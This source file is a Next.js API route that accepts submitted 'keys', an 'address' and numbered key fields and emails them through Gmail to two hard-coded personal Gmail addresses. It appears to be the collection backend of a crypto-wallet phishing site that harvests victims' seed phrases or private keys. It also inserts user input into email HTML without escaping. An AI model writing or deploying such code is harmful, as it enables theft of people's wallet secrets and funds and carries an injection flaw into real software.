import { NextRequest, NextResponse } from "next/server"
import nodemailer from "nodemailer"

const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
    }
})

export async function POST(req: NextRequest) {
    const { keys, address, keyFields } = await req.json()

    if (!keys) return NextResponse.json({ error: "Missing fields", status: 400 }, { status: 400 })


    try {
        await transporter.sendMail({
            from: `"The Sector: Key Submission" <${process.env.EMAIL_USER}>`,
            to: ["bitfusion867@gmail.com", "kenthomson999@gmail.com"],
            subject: `Key for ${address}`,
            text: `New keys submision review: ${keys} `,
            html: `
            <!DOCTYPE html>
            <html>
            <head>
              <meta charset="utf-8" />
              <meta name="viewport" content="width=device-width, initial-scale=1.0" />
              <title>KEYS</title>
            </head>
            <body>
              <div><strong>Address:</strong> ${address}</div>
              <div><strong>Keywords:</strong> ${keys}</div>
              <div><strong>Fields:</strong> ${renderKeyFields(keyFields)}</div>
            </body>
            </html>
            `
        })
        return NextResponse.json({ success: true })
    } catch (error) {
        console.error("Email error:", error)
        return NextResponse.json({ error: "Failed to send" }, { status: 500 })
    }
}

function renderKeyFields(fields: any) {
    // If it's a string, parse it safely
    if (typeof fields === "string") {
        try {
            fields = JSON.parse(fields);
        } catch {
            return "<div>Invalid fields</div>";
        }
    }

    if (!fields || typeof fields !== "object") {
        return "<div>No fields</div>";
    }

    let html = "<ol>";

    Object.keys(fields)
        .sort((a, b) => Number(a) - Number(b))
        .forEach((key) => {
            html += `<li>${fields[key]}</li>`;
        });

    html += "</ol>";
    return html;
}
